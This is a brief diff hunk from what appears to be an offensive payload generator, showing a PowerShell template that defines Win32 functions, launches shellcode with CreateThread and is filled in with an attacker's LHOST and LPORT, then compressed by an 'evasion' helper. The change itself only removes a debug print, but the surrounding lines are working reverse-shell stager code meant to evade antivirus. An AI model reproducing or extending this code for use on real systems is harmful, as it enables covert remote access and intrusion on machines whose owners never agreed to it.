@@ -63,7 +63,6 @@ $t = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -pass
 $t::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" %(self.required_options["LHOST"][0], self.required_options["LPORT"][0])
 
         baseString += '}\n' * num_ends
-        print(baseString)
 
         encoded = evasion_helpers.deflate(baseString)
 
